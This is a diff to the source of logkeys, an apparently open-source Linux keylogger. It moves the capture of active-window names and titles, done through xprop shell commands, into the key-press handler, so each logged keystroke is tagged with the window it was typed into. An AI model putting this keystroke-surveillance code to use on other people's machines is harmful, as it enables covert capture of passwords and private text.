@@ -52,6 +52,9 @@
 
 // active window id, title, name
 #define COMMAND_STR_AWID    "xprop -root 32x '\\t$0' _NET_ACTIVE_WINDOW | cut -f 2"
+#define COMMAND_XPROPID     "xprop -id "
+#define COMMAND_WMCLASS     " 0s '\\t$1' WM_CLASS | cut -f2-"
+#define COMMAND_WMNAME      " _NET_WM_NAME | cut -d'=' -f2-"
 
 #define INPUT_EVENT_PATH  "/dev/input/"  // standard path
 #define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
@@ -78,7 +81,7 @@ std::string execute(const char* cmd)
       if(fgets(buffer, 128, pipe) != NULL)
         result += buffer;
     pclose(pipe);
-    return result;
+    return result.erase(result.size()-1);
 }
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
@@ -338,6 +341,7 @@ void determine_input_device()
   // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
   // The compiler automatically concatenates these adjacent strings to a single string.
   const char* cmd = COMMAND_STR_DEVICE;
+
   std::stringstream output(execute(cmd));
   
   std::vector<std::string> results;
@@ -537,8 +541,9 @@ int main(int argc, char **argv)
   std::string process_name; 
   std::string window_title;
   std::string program_info;
+  char placeholder [151];
   bool program_changed = false;
-  
+
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
     
@@ -552,25 +557,10 @@ int main(int argc, char **argv)
     inc_size = 0;
     scan_code = event.code;
     
-    if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
+    if (scan_code >= sizeof(char_or_func)) {  // keqycode out of range, log error
       inc_size += fprintf(out, "<E-%x>", scan_code);
       if (inc_size > 0) file_size += inc_size;
       continue;
-    }
-
-    // on processid change, update window-title write '[process name] "window title" > '
-    if (args.flags & FLAG_WINDOW_TITLE) {
-      window_id = execute(COMMAND_STR_AWID);
-      
-      //// really ugly!
-      if (window_id.compare(old_window_id) != 0) {
-        process_name = sprintf("xprop -id $(%s) 0s '\\t$1' WM_CLASS | cut -f2-", window_id.c_str());
-        window_title = sprintf("xprop -id $(%s) _NET_WM_NAME | cut -d'=' -f2-", window_id.c_str());
-        window_title = execute(window_title.c_str());
-        process_name = execute(process_name.c_str());
-        program_info = "[" + process_name.erase(process_name.size() - 1) + "] " + window_title.erase(window_title.size() - 1) + " > "; // delete newline (why are newlines)
-        program_changed = true;
-      }
     }
 
     // if remote posting is enabled and size treshold is reached
@@ -628,6 +618,23 @@ int main(int argc, char **argv)
 
     // on key press
     if (event.value == EV_MAKE) {
+
+      // on processid change, update window-title write '["process name"] "window title" > '
+      // it's in the EV_MAKE clause because we are only interested in "visible" keypresses
+      if (args.flags & FLAG_WINDOW_TITLE) {
+        window_id = execute(COMMAND_STR_AWID);
+        
+        if (window_id.compare(old_window_id) != 0) {
+          snprintf(placeholder, sizeof(placeholder), COMMAND_XPROPID "%s" COMMAND_WMCLASS, window_id.c_str());
+          process_name = execute(placeholder);
+          snprintf(placeholder, sizeof(placeholder), COMMAND_XPROPID "%s" COMMAND_WMNAME, window_id.c_str());
+          window_title = execute(placeholder);
+
+          program_info = "[" + process_name + "]" + window_title + " > ";
+          program_changed = true;
+        }
+      }
+
       // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and window-title
       if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER) {
         inc_size += newline(out, event, program_changed, program_info);
@@ -646,6 +653,12 @@ int main(int argc, char **argv)
 
         inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect); // print character or string coresponding to received keycode; only print chars when not \0
       }
+
+      // update program id
+      if (args.flags & FLAG_WINDOW_TITLE) { 
+        old_window_id = window_id;
+        program_changed = false;
+      }
     } // if (EV_MAKE)
     
     // on key release
@@ -657,12 +670,6 @@ int main(int argc, char **argv)
       if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
         ctrl_in_effect = false;
     }
-
-    // update program id
-    if (args.flags & FLAG_WINDOW_TITLE) { 
-      old_window_id = window_id;
-      program_changed = false;
-    }
     
     prev_code = scan_code;
     fflush(out);
@@ -673,8 +680,8 @@ int main(int argc, char **argv)
   
   // append final timestamp, close files and exit
   time(&cur_time);
-  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
-  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
+    strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
+    fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
   
   fclose(out);
   
@@ -689,3 +696,4 @@ int main(int argc, char** argv)
 {
   return logkeys::main(argc, argv);
 }
+
